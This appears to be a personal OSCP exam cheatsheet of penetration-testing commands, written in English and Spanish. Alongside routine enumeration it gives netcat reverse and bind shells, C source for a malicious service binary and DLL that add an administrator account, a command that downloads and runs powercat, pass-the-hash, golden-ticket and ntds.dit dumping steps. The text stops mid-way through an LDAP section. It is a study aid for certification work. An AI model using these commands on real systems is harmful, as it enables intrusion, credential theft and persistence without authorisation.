# OSCP_Command_Cheatsheet

Just a handful of commands I normally use. There a lot of things that are missing, I will be updating this regularly as I keep learning/practicing new things.

Expect Spanglish, this is a cheatsheet. 

## Index

- [Misc Commands from Linux](#misc-commands-from-linux)
   - [Strings and files manipulation](#strings-and-files-manipulation)
   - [Sending/uploading Files to HTTP/WebDAV Server](#uploadsend-files-to-webdavhttp-server)
   - [Some Netcat (nc, nc.exe, ncat) commands](#some-netcat-nc-ncexe-ncat-commands)
   - [Wireshark Filters and pcap related](#wireshark-filters-and-pcap-related)
   - [Basic AF git commands](#basic-af-git-commands)
   - [Remote Desktop](#remote-desktop)
   - [Transfer files to windows](#transfer-files-to-windows)
- [Linux Enumeration](#linux-enumeration)
   - [Users & Groups](#users--groups)
   - [System Information](#system-information)
   - [Running Processes & CronJobs](#running-processes)
   - [Network Info](#network-info)
   - [Filesystem Related](#filesystem-related)
   - [Automated Enumeration](#automated-enumeration-scripts)
- [Windows Enumeration](#windows-enumeration)
   - [Windows Misc Commands](#windows-misc-commands)
   - [Users and Groups](#users-and-groups)
   - [Os info and Network Config](#os-info-and-network-config)
   - [Installed Software, Services and Process](#installed-software-services-and-process)
   - [Insecure Permissions for Service File](#insecure-permissions-for-service-file)
   - [Service DLL Hijacking](#service-dll-hijacking)
   - [*SeImpersonatePrivilege*](#seimpersonateprivilege)
- [AD Enumeration](#ad-enumeration)
   - [Using Legacy Tools, Default Win Tools and Sysinternals tools](#using-legacy-tools-default-windows-tools-and-sysinternals-tools)
   - [Using PowerView](#using-powerview)
   - [Automated enumeration with Bloodhound](#automated-enumeration-through-bloodhound-and-its-data-collectors)
- [Attacks to AD Authentication](to-do)	
- [AD Lateral Movement 101](#lateral-movement-in-ad-101)
- [Persistence in AD 101](#persistence-in-ad-101)
- [Port Scanning](#port-scanning)
- [Web Directory Scanning (and related)](#web-directory-scanning-and-related)
- [DNS Enumeration](#dns-enumeration)
- [Manually enumerate LDAP through Python console](#manually-enumerate-ldap-through-python-console)
- [SMB Enumeration](#smb-enumeration)
- [RPC Enumeration](#rpc-enumeration)
- [SNMP Enumeration](#snmp-enumeration)
- [SMTP Enumeration](#smtp-enumeration)
- [Kerberos Attacks](#kerberos-attacks)
- [Bruteforcing with Hydra](#bruteforce-hydra)
- [Hascat, John and HashCracking related](#hascat-john-and-hashcracking-related)
- [Tunneling and Port Forwarding](#tunneling-and-port-forwarding)
   - [Using Socat](#using-socat)
   - [Using OpenSSH](#using-openssh)
   - [Using Chisel](#using-chisel)
- [Mimikatz](#mimikatz)
- [Java Debugging Wire Protocol RCE](#jdwp-rce)

 

## Misc Commands from Linux

### Strings and files manipulation

```
# Extract gz file
gunzip acces.log.gz

# Extract tar.gz file
tar -xzvf file.tar.gz

# Search for a string in command history
history | grep frase_a_buscar

# Count lines
wc -l index.html

 # Visualizar el principio/fin de un fichero	
head/tail index.html

# Find a search for a file that contains a specific string in it’s name
find / -name sbd\*

# Extraer todas las líneas que tienen una string 	
grep "href=" index.html

# Cortar una string por un delimitador, filtrar los resultados con grep y ordenarlos
grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u

# Sustituir una determinada cadena por otra
cat algo.txt | awk '{gsub(/<cadena_a_sustituir>/,<cadena_a_introducir>);print}'

# Eliminar columna de un fichero de texto delimitada por un separador
cat algo.txt | awk -F: '{print $1":"$3}'

# Descodificar desde base64
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode

# Codificar a base64
echo -n "algo" | base64

# Descodificar desde HEX
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps

# Mostrar el contenido de un fichero usando grep y REGEX para filtrar
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt

# Ordenar por frecuencia y mostrar todas las IP's presentes en un fichero LOG
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

# Editing a file (and saving only the edited file, not a copy), deleting *-d* all lines starting with 1 *^1*
sed -i '/^1/d' demo.txt

```

[Back to top](#index)

### Upload/Send files to WebDav/HTTP Server

```
# Starting WebDAV server
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root <path_to_wherever>

#Upload file to webdav server
curl -X PUT <url> -T /path/to/local/file

#Send the contents of a file through a HTTP Request
curl --data @/path/to/file http://<server_ip>:<port>/
```

[Back to top](#index)

### Some Netcat (nc, nc.exe, ncat) commands 

```
# TCP Scan (-z flag for Zero I/O mode)
nc -nvv -w <timeout_in_seconds> -z <IP_ADDR> INITIAL_PORT_NUMBER-FINAL_PORT_NUMBER

# UDP Scan (-z flag for Zero I/O mode)
nc -nv -u -z -w 1 <IP_ADDR> INITIAL_PORT_NUMBER-FINAL_PORT_NUMBER

# Conectarse a otro puerto en otro host
nc -nv <ip_address> 110

# Poner puerto a la escucha
nc -nlvp 4444

# Enviar un fichero usando netcat
nc -nv <ip_address> 444 < /usr/share/windows/nc.exe

# Recibir fichero con netcat
nc -lvpn 4444 > incoming_file.exe

# Bind Shell con netcat en windows
nc.exe -nlvp 3344 -e cmd.exe

# Reverse shell con netcat en windows
nc.exe -nv <attacker_IP_address> <PORT> -e cmd.exe

# Bind Shell con netcat en linux
nc.exe -nlvp 3344 -e /bin/bash

# Reverse shell con netcat en linux
nc -nv <attacker_ip_address> 44444 -e /bin/bash

# Bind shell from windows
ncat --exec cmd.exe --allow <attacker_ip> -vnl 4444 --ssl

# Listen on port 444 using ssl
ncat -v <attacker_ip_Address> 444 --ssl

```

[Back to top](#index)

### Wireshark Filters and pcap related

```
# Filtro para mostrar trafico en puerto SMTP (25) y ICMP
tcp.port eq 25 or icmp

# Mostrar solo tráfico LAN (sin salida a Internet)
ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16

# Filtrar por protocolo (ejemplo SIP) y eliminar tráfico de IP's no deseadas
ip.src !=xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip

# Mostrar un ficher pcap
tcpdump -r passwordz.pcap

# Mostrar solo IP's y ordenarlas
tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head

# Capturar paquetes en el puerto 80
tcpdump tcp port 80 -w output.pcap -i eth0

```

[Back to top](#index)

### Basic AF git commands

```
# Enumerar todos los archivos nuevos o modificados que se deben confirmar
git status

# Toma una instantánea del archivo para preparar la versión
git add [file]

# Mover el archivo del área de espera, pero preservar su contenido
git reset [file]

# Registra las instantáneas del archivo permanentemente en el historial de versión
git commit -m "[descriptive message]"

# Mostrar las diferencias de archivos que no se han enviado aún al área de espera
git diff

# Mostrar las diferencias del archivo entre el área de espera y la última versión del archivo
git diff --staged

# Enumerar el historial de la versión para la rama actual
git log

# Enumerar el historial de versión para el archivo, incluidos los cambios de nombre
git log --follow [file]

# Producir metadatos y cambios de contenido del commit especificado
 git show[commit]

# Cambia a la rama especificada y actualiza el directorio activo
git checkout <commit_hash>

# Establecer el nombre que desea esté anexado a sus transacciones de commit
git config --global user.name "[name]"

# Establecer el e-mail que desea esté anexado a sus transacciones de commit
git config --global user.email "[email address]"

# Habilitar la útil colorización del producto de la línea de comando
git config --global color.ui auto

```

[Back to top](#index)

### Remote Desktop

```
# Using xfreerdp
 xfreerdp /u:'<domain\user>' /p:'<Password>' /v:<host_ip>:3389 (or another port if 3389 is not the case)

# Using rdekstop
rdesktop ip_address -k es -u user -p pass -d domain

```

[Back to top](#index)

### Transfer files to windows

```
# En la máquina kali)
python -m http.server

# Con certutil
# En windows 
certutil.exe -f -urlcache -split http://ip_kali:8000/fichero fichero

# Con powershell
# En windows     
new-object net.webclient).DownloadFile('http://ip_kali:8000/fichero', 'fichero')      # Opción 1
powershell Invoke-WebRequest "http://ip_kali:8000/fichero" -OutFile "fichero"         # Opción 2

# A través de una carpeta compartida de mi kali
# Levantar servidor SMB con impacket-smbserver
impacket-smbserver -smb2support -user <loquequieras> -password 'loquequieras' nombre_deseado_share ruta_carpeta_a_compartir

# Conectarse desde windows
NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES

```

[Back to top](#index)

### Network Information

```
# Listening ports
ss -t -l -n 2>/dev/null
netstat -ntpl 2>/dev/null

# Flush DNS cache
 resolvectl flush-caches

```

[Back to top](#index)

## Linux Enumeration

### Users & Groups
*/etc/passwd* file contains info about system users. File is structured in different lines, each one containing info about users with following fields:

|Field|Example Value|Description|
|-----|------------|-------------|
|Login Name| "joe" | Indicates the username used for login.|
|Encrypted Password| "x" | This field typically contains the hashed version of the user's password. In this case, the value x means that the entire password hash is contained in the /etc/shadow file (more on that shortly)|
|UID| "1000" | Aside from the root user that has always a UID of 0, Linux starts counting regular user IDs from 1000. This value is also called real user ID|
|GID| "1000" | Represents the user's specific Group ID|
|Comment| "joe,,," | This field generally contains a description about the user, often simply repeating username information|
|Home Folder| "/home/joe" | Describes the user's home directory prompted upon login|
|Login Shell| "/bin/bash" | Indicates the default interactive shell, if one exists|

*/etc/passwd* shouldn't be word writable. If by any chance this is the case it is possible to add a new privileged user:
1. Generate a *crypt* hash: `openssl passwd <password>`
2. Add the new user to */etc/passwd* `echo "root2:<previously_obtained_hash>:0:0:root:/root:/bin/bash" >> /etc/passwd`
3. Get privileged with `su root2`

This is because in order to achieve backwards compatibility, if a password hash for a user is found on */etc/passwd* file, it is considered valid for auth over the hash for the same user contained on */etc/shadow* (Same happens if there is no entry for the same user on */etc/shadow*).

```
# Current user
whoami
id

# Local users
cat /etc/passwd | grep -v nologin | grep -v /bin/false | cut -d':' -f1  # Display just the username of users with configured login shell

# Local Groups
groups # get the groups to which the current user belongs to.
cat /etc/group # Get all the local groups-

# Environmental variables
env

# Sudo rights
sudo -l
```

[Back to top](#index)

### System Information
```
# Hostname
hostname

# OS Info
cat /etc/issue	 # OS Version
cat /etc/os-release	 # Release related info.
uname -a 	# OS Kernel Version and architecture

# DPKG installed apps
dpkg -l

# As root, verify if AppArmor is loaded (AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles)
aa-status
```

[Back to top](#index)

### Running Processes

```
# Process
ps aux	# Processes with tty, including other users (a), in user-oriented format (u), and without controlling ttys.
ps -ef	# All process (-e) and in full format listing (-f)
top

# Execute ps command each second
watch -n 1 "ps -ef"

# Get the attributes for any process giben its PID
cat /proc/<PID>/status

# Cron Jobs
ls -lah /etc/cron*	# List hourly,daily,weekly,monthly cron jobs
crontab -l	# Running with root (sudo) privileges may impact the results. Scheduled Cron jobs for current user.

# Cron jobs related entries on /var/log/syslog
grep "CRON" /var/log/syslog

# Inspect cron.log file
cat /var/log/cron.log
```

[Back to top](#index)

### Network Info
```
# Show Listening Ports
netstat -tulpen		# Get all listening (-l) TCP/UDP (-tu) ports, displaying program/PID (-p), extended info (-e) and showing address in numeric way (-n)

# Show all connections
ss -anp	# Show all connections (-a), avoid hostname resolution (-n) and listing program/PID (-p)
netstat -ano	# Show all connections (-a), non-numeric way (-n) and displaying timers (-o)

# Firewall Rules (may require Root Privileges)
cat /etc/iptables/rules.v4

# IP Routing table
ip route
route
routel

# ARP Table
arp -v # Get ARP cache

# Capture traffic in lo interface and dump contents in ASCII
sudo tcpdump -i lo -A 
```

[Back to top](#index)

### FileSystem Related

Once juicy files/binaries are found, time to check [GTFOBins](https://gtfobins.github.io/) to loog for/find privesc ways.
```
# Find writable directories
find / -writable -type d 2>/dev/null	# To get writable files change -type to *f*

# Get all drives that will be omunted at boot time
cat /etc/fstab

# Get all mounted filesystems
mount

# Get all available disks
lsblk

# Get loaded kernel modules
lsmod

# Get more info about a specific kernel module
/sbin/modinfo <module_name>

# Get SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Get SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Get capabilites
/usr/sbin/getcap -r / 2>/dev/null
```

[Back to top](#index)

### Automated Enumeration Scripts

There are different alternatives:
1. [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
2. [linenum.sh](https://github.com/rebootuser/LinEnum)
3. unix-privesc-check (included in Kali) 

[Back to top](#index)

## Windows Enumeration

### Windows Misc Commands

```
# Recursively search for files under 'C:\' directory with a specific extension
Get-ChildItem -Path C:\ -Include *.kdbx,*.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Get the content of a file
Get-Content <filename> # type and cat are aliases for Get-Content in powershell
type <filename>
cat <filename>
more <filename> 

# Execute command as another user, GUI access needed.
runas /user:backupadmin cmd

# Command History for current user in Powershell
Get-History

# Delete the command History for current user (however, it will still be available in ConsoleHost_History.txt file)
Clear-History

#  Get the content of ConsoleHost_History.txt if it is available.
Get-Content ((Get-PSReadLineOption).HistorySavePath)

# Prevent PSReadLine from recording commands
Set-PSReadLineOption -HistorySaveStyle SaveNothing

# Reboot machine (Requires user with SeShutdownPrivilege)
shutdown /r /t 0

# Start/Stop Service
net start/stop <service_name>
Start-Service -NAme <service_name>
Stop-Service -Name <service_name>

# Test if a port is open on a remote host
Test-NetConnection -Port 445 <IP_ADDR>

# Perform a port scan using powershell (and scanning only first 1024 ports)
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP_ADDR>", $_)) "TCP port $_ is open"} 2>$null

# Share a folder
net share <share_name>=<path_to_the_folder_you_want_to_share> /GRANT:Everyone,FULL # Can replace Everyone with any username and FULL with READ or CHANGE

# Compile from command line using VSStudio
devenv.exe Expl.sln /Build "Release|x86"

# Or add the path to the $env:Path and use devenv
devenv Expl.sln /Build "Debug|x64"

```

[Back to top](#index)

### Users and groups

```
# Username
whoami

# Hostname
hostname

# Group memberships of current user
whoami /groups

# Other users on the machine
Get-LocalUser
net user

# Add administrator user to a machine
net user escalateAsFck DontLookDown123! /add
net localgroup administrators escalateAsFck /add

# Users logged on to the machine
Get-WmiObject Win32_LoggedOnUser -ComputerName <client01> | Select Antecedent -Unique

# Other groups on the machine
Get-LocalGroup
net localgroup

# Members of other groups
Get-LocalgroupMember <group_name>
net localgroup <group_name>

```

Useful privileges for Privilege Escalation:

1. *SeImpersonate*
2. *SeAssignPrimaryToken*
3. *SeBackup*
4. *SeRestore*
5. *SeTakeOwnership*
6. *SeCreateToken*
7. *SeDebug*
8. *SeLoadDriver*
9. *SeTcb*
10. *SeManageVolume*

[Back to top](#index)

### Os info and Network Config

```
# OS, OS Version, Architecture and more
systeminfo

# Network Configurations
ipconfig /all

# Routing table
route print

# List active network connections
netstat -ano

```

[Back to top](#index)

### Installed Software, Services and Process

```
# List installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  # 32-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # 64-bit applications
wmic product get name,version
Get-WmiObject -Class Win32_Product | Select-Object -Property Name
Get-AppxPackage ?AllUsers | Select Name, PackageFullName

# Running Processes
Get-Process
tasklist
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize #With allowed Usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id #Without usernames

# Services
Get-Service
Get-CimInstance -Class win32_service | select Name,State,StartMode,PathName | Where-Object { $_.State -like "Running"}
Get-CimInstance -Class win32_service | select Name,State,StartMode,PathName | where-object {$_.PathName -notlike "*system32*"} #List only service which binary is not located on system32 folder
sc.exe query
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\*
wmic service list brief
wmic.exe service get name
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ #Services with unquoted path (in cmd)
sc.exe qc <service_name>

#Scheduled Tasks
schtasks /query /fo LIST /v
Get-ScheduledTask 
```

[Back to top](#index)

### ICACLS output

A sequence of simple rights:

        F (full access)
        M (modify access)
        RX (read and execute access)
        R (read-only access)
        W (write-only access)

A comma-separated list in parenthesis of specific rights:

        D (delete)
        RC (read control)
        WDAC (write DAC)
        WO (write owner)
        S (synchronize)
        AS (access system security)
        MA (maximum allowed)
        GR (generic read)
        GW (generic write)
        GE (generic execute)
        GA (generic all)
        RD (read data/list directory)
        WD (write data/add file)
        AD (append data/add subdirectory)
        REA (read extended attributes)
        WEA (write extended attributes)
        X (execute/traverse)
        DC (delete child)
        RA (read attributes)
        WA (write attributes)

Inheritance rights may precede either Perm form, and they are applied only to directories:

        (OI): object inherit
        (CI): container inherit
        (IO): inherit only
        (NP): do not propagate inherit
        (I): permission inherited from parent container

[Back to top](#index)

### Insecure Permissions for Service File

Check permissions over the binary

```
# Get Service Binary Permissions
Get-ACL 
icacls "binary.exe"
```

If the binary can be modified, then:

- Compile a malicious binary

 `x86_64-w64-mingw32-gcc maliciousProgram.c -o maliciousBinary.exe`

- Place the binary with the same name and on the same folder as PathName property of the vulnerable service (the folder where the legitimate binary is stored)

 `move maliciousBinary.exe C:\legitimate\binary\folder\<same_binary_name>.exe`

 - Restart the service if possible `restart-service <servcie_name>` or restart the machine `shutdown /r /t 0`

*Malicious binary example code*

```
#include <stdlib.h>
int main ()
{
	int i;
	i = system ("net user escalateAsFck DontLookDown123! /add");
	i = system ("net localgroup administrators escalateAsFck /add");
	return 0;
}
```

[Back to top](#index)

### Service DLL Hijacking

In this case steps are in order to hijack the DLL search order from a vulnerable service. Microsoft standard search order is:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

To detect a service that tries to load missing DLL's Procmon from Sysinternals can be used. If this vulnerability is detected then:

- Compile a malicious DLL with `x86_64-w64-mingw32-gcc maliciousDLLcode.cpp --shared -o myMaliciousDLL.dll`
- Place the DLL (using the same name as the legitimate DLL thath the binary is trying to load) in any folder included in the DLL search order where the compromised user has writing permissions.
- Restart the service with `Restart-Service <service_name> 

*Malicious DLL example code*
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user escalateAsFck DontLookDown123! /add");
            i = system ("net localgroup administrators escalateAsFck /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

[Back to top](#index)

### *SeImpersonatePrivilege*

If we find ourseleves having compromised an user with this privilege enabled, there are various ways to escalate privileges.
1. Use JuicyPotato.exe if the OS version is prior to Windows 10 (1809)
2. Use RoguePotato.exe if OS versions is higher than Wndows 10 (1809) (there are more options as PrintSpoofer) [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)

To use RoguePotato, once it is transferred to the vulnerable machine:

On Kali:
1. Forward the incoming traffic to the port specified in *-l* flag of RoguePotato `socat tcp-listen:135,reuseaddr,fork tcp:<vulnerable_machine_ip>:9999`
2. Setuo a listener to receive the powercat reverse connection `nc -lvp <desired_port_to_receive_reverse_connection>`

On vulnerable host:
1. Execute RoguePotato: `.\RoguePotato.exe -r <kali_machine_ip> -e "powershell -c iex (new-object net.webclient).downloadstring('http://<kali_machine_ip>:8000/powercat.ps1')" -l 9999`

[Back to top](#index)


## AD Enumeration

### Using Legacy Tools, Default Windows Tools, and Sysinternals Tools

```
# List Domain users
net user /domain

# Get info about a specific User
net user <username> /domain

# List Domain groups
net group /domain

# Get info about a specific Domain Group
net group <group_name> /domain

# Check who is logged where PsLoggedOn from SysInternals
.\PsLoggedon.exe \\<computer_dnshostname>

# Enumerate SPN in the Domain
setspn -L <username>
```

[Back to top](#index)

### Using PowerView

Some domains will require auth to perform the LDAP queries that PowerView performs. If so, use the *-Credential* flag passing as argument a PSCredentialObject.

Steps to store creds in a PSCredentialObject are the following:

```
# Define Credentials
[string]$user = 'admin'
[string]$pass = 'mySuperSecurePassword'

# Create credential Object
[SecureString]$secureString = $pass | ConvertTo-SecureString -AsPlainText -Force 
[PSCredential]$credentialObject = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $secureString
```

Now you are ready to keep enumerating domain objects.

```
# Domain Information
Get-NetDomain

# Domain User objects
Get-NetUSer

# Domain Users cn attribute
Get-NetUser | select cn

# Domain Users cn,pwdlastset and lastlogon attributes
Get-NetUSer | select cn,pwdlastset,lastlogon

# Domain Groups cn attribute
Get-NetGroup | select cn

# Members of a Domain Group
Get-NetGroup "<group_name>" | select member

# Computes on the Domain
Get-NetComputer

# Domain Computers DNSHostName, Operating System and OS Version
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

# Check wether a compromised user has LocalAdminRights on other computers of the domain
Find-LocalAdminAccess

# Check who is logged where (uses 2 Windows API, NetWkstaUserEnum (requires administrative privs) and NetSessionEnum)
Get-NetSession -ComputerName <computer_dnshostname> -Verbose

# Enumerate Domain SPN's
Get-NetUser -SPN | select camaccountname,serviceprincipalname

# Get an Object's Access Control List
get-acl -identity samaccountname

# From previous ouput, important attributes are
- ObjectSID: object which the ACL refers to
- ActiveDirectoryRights: type of permission applied to the object.
- SecurityIdentifier: the user object that has the permissions stated in ActiveDirectoryRights over the object.

# To make SIDs human-readable:
Convert-SidToName <sid_value>

# Find shares in the domain
Find-DomainShare

```

[Back to top](#index)

### Automated Enumeration through Bloodhound and its Data Collectors

More Information about [BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html) and [Sharphound Collector](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)

Is is important to check that the Active Sessions information is correctly collected. The collection methods that are included in the DEFAULT and ALL options do not include LOGGEDON because it need to be executed with Local Admin Rights.

Also, the SESSIONS collection method works better if it is combined with the --Loop option (loop duration can also be specified using --LoopDuration)

```
# Collect Data From a Non-Domain-Joined Computer (our kali)
bloodhound-python -d <domain> -u <username> -p <password> -gc <global_catalog_host> -c all -ns <nameserver_ip>

# Collect Active Sessions Data through proxychains (observe the flag --dns-tcp)
proxychains -q bloodhound-python -d <domain> -u <username> -p <password> -c LoggedOn -ns <dns_server_ip> -dc <dc_hostname> --dns-tcp

# Collect Data From a Compromised Domain-Joined Computer
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"    # Using PowerShell Module Sharphound.ps1
.\sharphound.exe -CollectionMethods ALL    # Using sharphound.exe

```
[Back to top](#index)


### Lateral Movement in AD 101

#### WMIC/CIM

```
# Execute command in another domain joined machine using WMIC
wmic /node:<target_ip_address> /user:<user> /password:<pass> process call create "calc"

# Execute commmand in another domain joined machine using Invokke-CimMethod (through a CimSession opened with New-CimSession)
# First create the PsCredential object
$username = <user>;
$password = <pass>;
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# Second, create a CIM session
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <ip> -Credential $credential -SessionOption $Options 
$command = 'calc';
#Invoke the CIM method through the recently created CIM session
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

#### WinRM protocol
```
# Execute command in another domain joined computer with winrs (WinRM protocol)
winrs -r:<target_hostname> -u:<user> -p:<pass>  "cmd /c hostname & whoami"

# Execute command in another domain joined computer with New-PSSession. PsCredential object must be created as shown above.
# Create the WinRM session
New-PSSession -ComputerName <target_hostname/IP_address> -Credential $credential
# Enter the newly created WinRM session
Enter-PSSession 1
```

#### PsExec
```
# Execute command in another domain joined computer using PSExec
./PsExec64.exe -i  \\<hostname> -u <domain\user> -p <pass> cmd

```

#### PassTheHash
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
## ToDo -> add other tools used for PTH
```

#### OverPassTheHash
```
# Using mimikatz, leverage the NTLM hash of an user to get a Kerberos Ticket (TGT) as this user and run commands on his behalf avoiding NTLM authentication
# First open a shell as the user
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
# Generate a ticket in the newly opened shell
net use \\<hostname>
# Use psexec to execute command as him (hostname must be the same as the TGT is only valid in the hostname it was created for.
.\psexec.exe \\<hostname> cmd
```

#### Pass The Ticket
```
# Export current available tickets from LSASS process memory (TGT's & TGS')
sekurlsa::tickets /export
# Inject any of the recently exported TGS' from another user ([some_string]-0-0-32412u01-<username>@<service_name>-<hostname>.kirbi)
kerberos::ptt <ticket_name.kirbi>
# Now is possible to access the service as the ticket owner
```

#### Using DCOM
```
# Initiate a remote MMC2.0 application
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_ip>"))
# Use the ExecuteShellCommand method to execute commands (accpets 4 parameter: Command, Directory, Parameters, and WindowState)
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <base64_encoded_reverse_shell>","7")
```

[Back to top](#index)


### Persistence in AD 101

#### Golden Ticket
To use the golden ticket (any forged ticket), NTLM auth must be avoided by using hostname instead of IP_ADDRESS.

```
# Using mimikatz.
kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_NTLM_hash> /ptt
misc::cmd 
```

#### Shadow Copy

Using *vshadow.exe*
```
vshadow.exe -nw -p  C: # -nw to disable writers to speed up the process. 
# Get the Shadow Copy Device Name (something like:  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2)
copy <shadow_copy_device_name>\windows\ntds\ntds.dit C:\ntds.dit.bak # Extract/copy the ntds.dit database from recently copied volume
reg.exe save hklm\system c:\system.bak # Save the system hive
# After transfering files to Kali 
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

[Back to top](#index)

## Port Scanning

This only contains what I normally use, there are more options available at [S4vitar - Preparación OSCP - Port Scanning](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#port-scanning)

```
# Puertos abiertos
sudo nmap -sS -p- --min-rate 10000 -oN hostnameOpenPorts hostname

# Servicios y versiones
nmap -sS -sV -O -sC --min-rate 1000 -p<port1,port2,port3...> -oN hostnameServiceVersions hostname

# SynScan + UDP Scan
nmap -sU -sS <ip_addr>

# Discover Hosts and save data in greppable format
nmap -v -sn 192.168.x.1-253 -oG hostDiscovery.txt

# Extract Active hosts from previously saved scan output
grep Up hostDiscovery.txt | cut -d " " -f 2

# Discover active hosts by checking the most used 20 ports (flag -A for agressive scan to detect Servie Versions and OS detection)
nmap -sS -A --top-ports=20 X.X.X.1-253 -oG hostDiscovery.txt

# Nmap script scan (Scripts located under /usr/share/nmap/scripts)
nmap --script <script-title> <ip_addr>
```

[Back to top](#index)

## Web Directory Scanning (and related)

```
# GoBuster
gobuster dir -u <URL> -w <wordlist> -x <desired_extensions> -k

# Virtual hosts search
ffuf -u <URL> -H "Host: FUZZ.example.com" -w <wordlist> -fs <page_size>

# FeroxBuster (makes the search recursively)
feroxbuster -k -u <url> -x php -o <output> -w <wordlist>

# Parameter Fuzzing using ffuf
ffuf -w burp-parameter-names.txt -u http://domain.com/index.php?FUZZ=id -fw <numero de palabras en la respuesta legítima>

# Search for plugins in Wordpress Sites
ffuf -w Bug-Bounty-Wordlists/wp-plugins.txt-u http://domain.com/wp-content/plugins/FUZZ 

# IIS Short Name Scan (using 20 threads and showing progress)
java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/

# Shortscan (another option to scan 8.3 file names)
go/bin/shortscan http://url

```

[Back to top](#index)

## DNS Enumeration

```
# Search IP address of a hostname (A record)
host www.<domain>.com

#Search any type or Record (A,MX,TXT,AAAA)
host -t <record_type> domain.com

# Búsqueda de hosts con Nmap
nmap -F --dns-server <dns server ip> <target ip range>

# Consulta DNS registro A
dig A @nameserver_ip domain-name-here.com 

# Any information
dig ANY @<DNS_IP> <DOMAIN>    

# IPv6 DNS request
dig AAAA @<DNS_IP> <DOMAIN>    

# Information
dig TXT @<DNS_IP> <DOMAIN>

# Registros MX    
dig MX @<DNS_IP> <DOMAIN>

# ¿Qué DNS resuelve este nombre? 
dig NS @<DNS_IP> 

# Búsqueda inversa      
dig -x 192.168.0.2 @<DNS_IP>

# Búsqueda inversa IPv6
dig -x 2a00:1450:400c:c06::93 @<DNS_IP>

# Transferencia de Zona sin especificar nombre de dominio
dig axfr @<DNS_IP>

# Transferencia de zona especificandeo nombre de dominio
dig axfr  @<DNS_IP> <DOMAIN>

# With powershell, get the info of a specific zone on the DNS Server
 get-dnsserverresourcerecord -ComputerName <computer_name> -ZoneName zone1.domain.com

# Extract the A registers of a specific DNS Zone
get-dnsserverresourcerecord -ComputerName <computer_name> -ZoneName zone1.domain.com -RRType A

# Automatically extract DNS info with DNSRECON
dnsrecon -d <domain.name> -t std

# Automatically extract DNS info with DNSENUM
dnsenum <domain.name>

# Using nslookup to extract A records
nslookup <domain.name>

# Using nslookup against a specific DNServer to extract records of domain
nslookup -type=<Record_Type_A/AAAA/TXT/MX/ANY> domain.name <specific_DNS_IP_ADD>

```

[Back to top](#index)

## Manually enumerate LDAP through Python console

More LDAP search filters available at [Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 

```
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server) # Conexión anónima
